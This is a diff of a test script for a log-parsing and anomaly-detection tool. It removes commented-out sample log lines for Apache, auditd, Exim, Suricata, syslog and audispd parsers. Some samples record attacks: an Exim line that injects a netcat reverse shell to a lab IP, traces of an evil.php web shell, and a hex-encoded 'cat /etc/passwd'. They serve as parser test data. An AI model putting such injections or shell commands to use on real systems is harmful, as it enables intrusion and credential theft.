@@ -51,386 +51,386 @@ EOL
     BN=`basename "$filename" .py`
     echo "Testing $BN"
     case $BN in
-#        ApacheAccessParsingModel)
-#            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
-#            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
-#            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
-#            ;;
-#        ApacheErrorParsingModel)
-#            echo '[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  Declaration of Horde_Form_Type_pgp::init($gpg, $temp_dir = NULL, $rows = NULL, $cols = NULL) should be compatible with Horde_Form_Type_longtext::init($rows = 8, $cols = 80, $helper = Array) in /usr/share/php/Horde/Form/Type.php on line 878, referer: http://mail.cup.com/nag/' > $LOG_FILE
-#            echo "[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  system(): Cannot execute a blank command in words.php on line 12" > $LOG_FILE
-#            echo "[Wed Mar 04 19:32:45.144442 2020] [:error] [pid 8738] [client 192.168.10.238:60488] PHP Notice:  Undefined index: cmd in /var/www/mail.cup.com/static/evil.php on line 1" >> $LOG_FILE
-#            echo "[Wed Mar 04 06:26:43.756548 2020] [:error] [pid 22069] [client 192.168.10.190:33604] PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP; Horde_Form_Variable has a deprecated constructor in /usr/share/php/Horde/Form/Variable.php on line 24, referer: http://mail.cup.com/nag/" >> $LOG_FILE
-#            ;;
-#        AuditdParsingModel)
-#            echo 'type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' > $LOG_FILE
-#            echo 'type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOG_FILE
-#            echo 'type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOG_FILE
-#            echo 'type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOG_FILE
-#            echo 'type=LOGIN msg=audit(1582935421.373:947570): pid=25821 uid=0 old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1' >> $LOG_FILE
-#            echo "type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOG_FILE
-#            echo "type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
-#            echo 'type=CRED_REFR msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=USER_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=USER_ACCT msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=USER_AUTH msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=CRED_DISP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=SERVICE_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=SERVICE_STOP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=USER_END msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=USER_CMD msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=CRED_ACQ msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
-#            echo 'type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOG_FILE
-#            ;;
-#        EximParsingModel)
-#            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
-#            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
-#            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
-#            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
-#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
-#            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
-#            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
-#            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
-#            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
-#            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
-#            ;;
-#        SuricataEventParsingModel)
-#            echo '{"timestamp":"2020-02-29T00:00:12.734324+0000","flow_id":914989792375924,"in_iface":"eth0","event_type":"dns","src_ip":"192.168.10.154","src_port":53985,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","dns":{"type":"query","id":30266,"rrname":"190.10.168.192.in-addr.arpa","rrtype":"PTR","tx_id":0}}' > $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T00:00:14.000538+0000","flow_id":1357371404246463,"event_type":"flow","src_ip":"192.168.10.154","src_port":46289,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","app_proto":"dns","flow":{"pkts_toserver":1,"pkts_toclient":1,"bytes_toserver":87,"bytes_toclient":142,"start":"2020-02-28T23:55:12.974271+0000","end":"2020-02-28T23:55:13.085657+0000","age":1,"state":"established","reason":"timeout","alerted":false}}' >> $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T00:00:14.886252+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"http","src_ip":"192.168.10.190","src_port":39438,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":1,"http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326}}' >> $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T00:00:14.977952+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"fileinfo","src_ip":"192.168.10.154","src_port":80,"dest_ip":"192.168.10.190","dest_port":39438,"proto":"TCP","http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326},"app_proto":"http","fileinfo":{"filename":"\/services\/portal\/","state":"CLOSED","stored":false,"size":41080,"tx_id":1}}' >> $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T00:00:18.000491+0000","event_type":"stats","stats":{"uptime":17705,"capture":{"kernel_packets":337720,"kernel_drops":0},"decoder":{"pkts":337749,"bytes":229373623,"invalid":3062,"ipv4":335528,"ipv6":10,"ethernet":337749,"raw":0,"null":0,"sll":0,"tcp":317611,"udp":14805,"sctp":0,"icmpv4":50,"icmpv6":10,"ppp":0,"pppoe":0,"gre":0,"vlan":0,"vlan_qinq":0,"teredo":0,"ipv4_in_ipv6":0,"ipv6_in_ipv6":0,"mpls":0,"avg_pkt_size":679,"max_pkt_size":1486,"erspan":0,"ipraw":{"invalid_ip_version":0},"ltnull":{"pkt_too_small":0,"unsupported_type":0},"dce":{"pkt_too_small":0}},"flow":{"memcap":0,"spare":10001,"emerg_mode_entered":0,"emerg_mode_over":0,"tcp_reuse":0,"memuse":7104256},"defrag":{"ipv4":{"fragments":0,"reassembled":0,"timeouts":0},"ipv6":{"fragments":0,"reassembled":0,"timeouts":0},"max_frag_hits":0},"tcp":{"sessions":7155,"ssn_memcap_drop":0,"pseudo":1082,"pseudo_failed":0,"invalid_checksum":0,"no_flow":0,"syn":7418,"synack":7307,"rst":3226,"segment_memcap_drop":0,"stream_depth_reached":0,"reassembly_gap":375,"memuse":819200,"reassembly_memuse":12281632},"detect":{"alert":58},"app_layer":{"flow":{"http":4883,"ftp":0,"smtp":0,"tls":1564,"ssh":0,"imap":0,"msn":0,"smb":0,"dcerpc_tcp":0,"dns_tcp":0,"failed_tcp":258,"dcerpc_udp":0,"dns_udp":6951,"failed_udp":119},"tx":{"http":13248,"smtp":0,"tls":0,"dns_tcp":0,"dns_udp":7185}},"flow_mgr":{"closed_pruned":7112,"new_pruned":21,"est_pruned":6999,"bypassed_pruned":0,"flows_checked":1,"flows_notimeout":0,"flows_timeout":1,"flows_timeout_inuse":0,"flows_removed":1,"rows_checked":65536,"rows_skipped":65535,"rows_empty":0,"rows_busy":0,"rows_maxlen":1},"dns":{"memuse":24462,"memcap_state":0,"memcap_global":0},"http":{"memuse":61601,"memcap":0}}}' >> $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T00:01:53.976648+0000","flow_id":378741657290945,"in_iface":"eth0","event_type":"tls","src_ip":"192.168.10.238","src_port":53156,"dest_ip":"192.168.10.154","dest_port":443,"proto":"TCP","tls":{"subject":"CN=mail.cup.com","issuerdn":"CN=ChangeMe","fingerprint":"12:7a:88:ea:52:10:62:44:f0:c5:33:8a:28:2d:ad:12:a1:4e:7e:18","sni":"mail.cup.com","version":"TLS 1.2","notbefore":"2020-02-28T18:40:23","notafter":"2030-02-25T18:40:23"}}' >> $LOG_FILE
-#            echo '{"timestamp":"2020-02-29T06:11:02.147044+0000","flow_id":415686269975930,"in_iface":"eth0","event_type":"alert","src_ip":"192.168.10.238","src_port":50850,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":0,"alert":{"action":"allowed","gid":1,"signature_id":2012887,"rev":3,"signature":"ET POLICY Http Client Body contains pass= in cleartext","category":"Potential Corporate Privacy Violation","severity":1},"http":{"hostname":"mail.cup.com","url":"\/login.php","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"POST","protocol":"HTTP\/1.1","status":302,"redirect":"\/services\/portal\/","length":20}}' >> $LOG_FILE
-#            ;;
-#        SuricataFastParsingModel)
-#            echo "02/29/2020-00:00:13.674931  [**] [1:2012887:3] ET POLICY Http Client Body contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.10.190:39438 -> 192.168.10.154:80" > $LOG_FILE
-#            ;;
-#        SyslogParsingModel)
-#            echo "Feb 29 00:01:41 mail-0 dovecot: imap(kelsey): Logged out in=79 out=875" > $LOG_FILE
-#            echo "Mar  1 06:25:38 mail dovecot: imap(lino): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:38]" >> $LOG_FILE
-#            echo "Feb 29 00:01:44 mail-0 dovecot: imap(della): Error: file_dotlock_create(/var/mail/della) failed: Permission denied (euid=1013(della) egid=1013(della) missing +w perm: /var/mail, we're not in group 8(mail), dir owned by 0:8 mode=0775) (set mail_privileged_group=mail)" >> $LOG_FILE
-#            echo "Mar  1 06:25:41 mail dovecot: imap(idella): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:41]" >> $LOG_FILE
-#            echo "Mar  4 14:14:36 mail dovecot: imap-login: Disconnected (auth failed, 2 attempts in 12 secs): user=<violet>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, secured, session=<fEeWCQigUph/AAAB>" >> $LOG_FILE
-#            echo "Mar  4 18:43:05 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.10.185, lip=192.168.10.177, session=<cjd4ygugaJTAqAq5>" >> $LOG_FILE
-#            echo "Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>" >> $LOG_FILE
-#            echo "Mar  4 18:43:59 mail dovecot: imap-login: Login: user=<sadye>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=11475, secured, session=<8ZitzQugnrh/AAAB>" >> $LOG_FILE
-#            echo "Feb 29 11:39:45 mail-0 dovecot: imap-login: Error: anvil: Anvil queries timed out after 5 secs - aborting queries" >> $LOG_FILE
-#            echo "Feb 29 09:15:59 mail-1 dovecot: imap-login: Warning: Auth process not responding, delayed sending initial response (greeting): user=<>, rip=127.0.0.1, lip=127.0.0.1, secured, session=<dVUEZ7OfnLl/AAAB>" >> $LOG_FILE
-#            echo "Feb 29 11:39:35 mail-2 dovecot: auth: Error: auth worker: Aborted PASSV request for marjory: Worker process died unexpectedly" >> $LOG_FILE
-#            echo "Feb 29 11:39:35 mail-2 dovecot: auth-worker(2233): Fatal: Error reading configuration: Timeout reading config from /var/run/dovecot/config" >> $LOG_FILE
-#            echo "Feb 29 11:39:35 mail-2 dovecot: master: Error: service(auth-worker): command startup failed, throttling for 2 secs" >> $LOG_FILE
-#            echo 'Feb 29 11:39:46 mail-2 HORDE: [imp] Login success for marjory (192.168.10.18) to {imap://localhost/} [pid 1764 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOG_FILE
-#            echo 'Feb 29 17:18:23 mail-2 HORDE: [imp] Message sent to marcelle@mail.insect.com, merlene@mail.insect.com from les (192.168.10.18) [pid 9596 on line 970 of "/var/www/mail.insect.com/imp/lib/Compose.php"]' >> $LOG_FILE
-#            echo 'Feb 29 20:01:48 mail-2 HORDE: [imp] FAILED LOGIN for violet (192.168.10.18) to {imap://localhost/} [pid 14794 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOG_FILE
-#            echo 'Mar  1 06:25:38 mail HORDE: [imp] [status] Could not open mailbox "INBOX". [pid 999 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
-#            echo 'Mar  1 06:27:56 mail HORDE: [imp] [getSyncToken] IMAP error reported by server. [pid 1127 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
-#            echo 'Feb 29 12:12:54 mail-2 HORDE: [horde] Login success for dorie to horde (192.168.10.18) [pid 2272 on line 163 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
-#            echo 'Feb 29 12:13:00 mail-2 HORDE: [horde] User marjory logged out of Horde (192.168.10.18) [pid 2988 on line 106 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
-#            echo 'Feb 29 17:07:07 mail-2 HORDE: [horde] FAILED LOGIN for marcelle to horde (192.168.10.98) [pid 8517 on line 198 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
-#            echo 'Mar  1 18:22:40 mail HORDE: [imp] [login] Authentication failed. [pid 12890 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
-#            echo 'Mar  4 18:55:05 mail HORDE: [turba] PHP ERROR: finfo_file(): Empty filename or path [pid 11642 on line 166 of "/usr/share/php/Horde/Mime/Magic.php"]' >> $LOG_FILE
-#            echo 'Mar  4 18:50:51 mail HORDE: [horde] PHP ERROR: Cannot modify header information - headers already sent [pid 11019 on line 0 of "Unknown"]' >> $LOG_FILE
-#            echo 'Mar  4 18:01:23 mail HORDE: Guest user is not authorized for Horde (Host: 192.168.10.81). [pid 4815 on line 324 of "/usr/share/php/Horde/Registry.php"]' >> $LOG_FILE
-#            echo 'Mar  4 18:10:08 mail HORDE: PHP ERROR: rawurlencode() expects parameter 1 to be string, array given [pid 6556 on line 302 of "/usr/share/php/Horde/Url.php"]' >> $LOG_FILE
-#            # missing model/service/horde/horde/free_msg - no log found!
-#            echo "Feb 29 12:39:02 mail-0 CRON[11260]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)" >> $LOG_FILE
-#            echo "Feb 29 06:25:01 mail-1 CRON[27486]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
-#            echo "Feb 29 15:42:36 mail-1 auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=marcelino rhost=127.0.0.1  user=marcelino" >> $LOG_FILE
-#            echo "Mar  1 03:09:18 mail-0 systemd[1]: Starting Clean php session files..." >> $LOG_FILE
-#            echo "Mar  1 03:09:19 mail-0 systemd[1]: Started Clean php session files." >> $LOG_FILE
-#            echo "Mar  1 18:26:18 mail systemd[1]: Starting Cleanup of Temporary Directories..." >> $LOG_FILE
-#            echo "Mar  1 18:26:18 mail systemd[1]: Started Cleanup of Temporary Directories." >> $LOG_FILE
-#            echo "Mar  2 06:37:52 mail systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOG_FILE
-#            echo "Mar  2 06:37:53 mail systemd[1]: Started Daily apt upgrade and clean activities." >> $LOG_FILE
-#            echo "Mar  2 12:30:18 mail systemd[1]: Starting Daily apt download activities..." >> $LOG_FILE
-#            echo "Mar  2 12:30:19 mail systemd[1]: Started Daily apt download activities." >> $LOG_FILE
-#            echo "Mar  3 06:29:00 mail systemd[1]: Starting Security Auditing Service..." >> $LOG_FILE
-#            echo "Mar  3 06:29:00 mail systemd[1]: Started Security Auditing Service." >> $LOG_FILE
-#            echo "Mar  4 06:29:05 mail systemd[1]: Stopping Security Auditing Service..." >> $LOG_FILE
-#            echo "Mar  4 06:29:05 mail systemd[1]: Stopped Security Auditing Service." >> $LOG_FILE
-#            echo "Mar  5 06:25:35 mail systemd[1]: Reloading The Apache HTTP Server." >> $LOG_FILE
-#            echo "Mar  5 06:25:35 mail systemd[1]: Reloaded The Apache HTTP Server." >> $LOG_FILE
-#            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounting Arbitrary Executable File Formats File System..." >> $LOG_FILE
-#            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounted Arbitrary Executable File Formats File System." >> $LOG_FILE
-#            echo "Feb 29 13:56:59 mail-2 systemd[1]: apt-daily.timer: Adding 6h 4min 46.743459s random time." >> $LOG_FILE
-#            # missing model/service/systemd/service - no log found!
-#            echo "Feb 29 07:24:02 mail-0 kernel: [47678.309129]  [<ffffffff92e1e577>] ? ret_from_fork+0x57/0x70" >> $LOG_FILE
-#            echo "Mar  5 06:29:07 mail augenrules[17378]: backlog_wait_time 0" >> $LOG_FILE
-#            echo "Mar  5 06:29:07 mail auditd[17377]: dispatch error reporting limit reached - ending report notification." >> $LOG_FILE
-#            echo "Mar  5 06:29:07 mail auditd: audit log is not writable by owner" >> $LOG_FILE
-#            echo "Mar  4 06:29:05 mail audispd: No plugins found, exiting" >> $LOG_FILE
-#            echo 'Mar  3 06:29:01 mail liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="480" x-info="http://www.rsyslog.com"] rsyslogd was HUPed' >> $LOG_FILE
-#            echo "Mar  1 09:25:16 mail freshclam[22090]: Sun Mar  1 09:25:16 2020 -> bytecode.cvd is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)" >> $LOG_FILE
-#            echo "Mar  1 07:26:09 mail dhclient[418]: DHCPREQUEST of 192.168.10.21 on eth0 to 192.168.10.2 port 67" >> $LOG_FILE
-#            echo "Mar  1 00:59:38 mail-2 dhclient[387]: DHCPACK of 192.168.10.21 from 192.168.10.2" >> $LOG_FILE
-#            echo "Feb 29 21:12:42 mail-2 dhclient[418]: bound to 192.168.10.21 -- renewal in 36807 seconds." >> $LOG_FILE
-#            ;;
-#        AminerParsingModel)
-#            sudo cp ./demo/aminer/jsonConverterHandler-demo-config.py /tmp/demo-config.py
-#            sudo ./demo/aminer/aminerDemo.sh > $LOG_FILE
-#            sed -i -e 1,2d $LOG_FILE
-#            sed -i -e "/Generating data for the LinearNumericBinDefinition histogram report../d" $LOG_FILE
-#            sed -i -e "/Generating data for the ModuloTimeBinDefinition histogram report../d" $LOG_FILE
-#            sed -i "/^CPU Temp: /d" $LOG_FILE
-#            sed -i "/^first$/d" $LOG_FILE
-#            sed -i "/^second$/d" $LOG_FILE
-#            sed -i "/^third$/d" $LOG_FILE
-#            sed -i "/^fourth$/d" $LOG_FILE
-#            cat >> $CONFIG_PATH <<EOL
-#        json_format: True
-#EOL
-#            ;;
-#        ApacheAccessModel)
-#            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
-#            echo '127.0.0.1 - - [01/May/2020:21:44:53 +0200] "GET /phpmyadmin/sql.php?server=1&db=seconlineportaldb&table=CONTRACT&pos=0 HTTP/1.1" 200 5326 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"' >> $LOG_FILE
-#            echo '127.0.0.1 - - [01/Apr/2020:09:19:23 +0200] "GET /phpmyadmin/themes/pmahomme/img/b_drop.png HTTP/1.1" 304 180 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6340393753ltr&server=1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"' >> $LOG_FILE
-#            echo '111.222.333.123 HOME user1 [01/Feb/1998:01:08:39 -0800] "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"' >> $LOG_FILE
-#            echo '::1 - - [31/Mar/2020:15:14:28 +0200] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1c (internal dummy connection)"' >> $LOG_FILE
-#            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
-#            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
-#            echo '192.168.10.190 - - [29/Feb/2020:13:58:55 +0000] "POST /nag/task/save.php HTTP/1.1" 200 5220 "-" "-"' >> $LOG_FILE
-#            echo 'www.google.com - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
-#            ;;
-#        AudispdParsingModel)
-#            echo "audispd: type=ADD_GROUP msg=audit(1525173583.598:2104): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding group acct=\"raman\" exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" > $LOG_FILE
-#            echo "audispd: type=ADD_USER msg=audit(1525173583.670:2105): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding user id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOG_FILE
-#            echo "audispd: type=ADD_USER msg=audit(1525173583.677:2106): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding home directory id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOG_FILE
-#            echo 'type=ANOM_ABEND msg=audit(1459467717.181:189187): auid=4294967295 uid=977 gid=2010 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 pid=40239 comm="radiusd" reason="memory violation" sig=11' >> $LOG_FILE
-#            echo 'audispd: type=ANOM_ABEND msg=audit(1459370041.594:534): auid=10000 uid=0 gid=0 ses=6 subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 pid=3697 comm="sshd" reason="memory violation" sig=6' >> $LOG_FILE
-#            echo "audispd: type=ANOM_ACCESS_FS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_ADD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_AMTU_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_CRYPTO_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_DEL_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_EXEC msg=audit(1222174623.498:608): user pid=12965 uid=1 auid=2 ses=1 msg='op=PAM:unix_chkpwd acct=\"snap\" exe=\"/sbin/unix_chkpwd\" (hostname=?, addr=?, terminal=pts/0 res=failed)'" >> $LOG_FILE
-#            echo "audispd: type=ANOM_LOGIN_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_LOGIN_FAILURES msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_LOGIN_LOCATION msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_LOGIN_SESSIONS msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_LOGIN_TIME msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_MAX_DAC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_MAX_MAC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_MK_EXEC msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_MOD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_PROMISCUOUS msg=audit(1390181243.575:738): dev=vethDvSeyL prom=256 old_prom=256 auid=4294967295 uid=0 gid=0 ses=4294967295" >> $LOG_FILE
-#            echo "audispd: type=ANOM_RBAC_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_RBAC_INTEGRITY_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
-#            echo "audispd: type=ANOM_ROOT_TRANS msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo "type=AVC msg=audit(1226270358.848:238): avc:  denied  { write } for  pid=13349 comm=\"certwatch\" name=\"cache\" dev=dm-0 ino=218171 scontext=system_u:system_r:certwatch_t:s0 tcontext=system_u:object_r:var_t:s0 tclass=dir" >> $LOG_FILE
-#            echo "audispd: type=AVC_PATH msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
-#            echo 'audispd: type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOG_FILE
-#            echo "type=CAPSET msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
